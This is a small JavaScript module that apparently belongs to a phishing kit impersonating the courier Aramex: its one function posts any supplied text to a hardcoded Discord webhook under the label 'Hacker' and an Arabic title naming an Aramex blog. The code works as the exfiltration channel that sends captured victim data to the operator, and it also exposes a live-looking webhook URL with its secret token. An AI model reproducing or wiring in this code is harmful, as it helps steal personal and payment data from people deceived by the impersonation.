import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1326158309257904148/NX45rq8wmXTQvRN60SksW2B4KgMexn9NgRNaI4uZqxWFiXbagoc5LbMlQRwCOp_cM1Kn",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
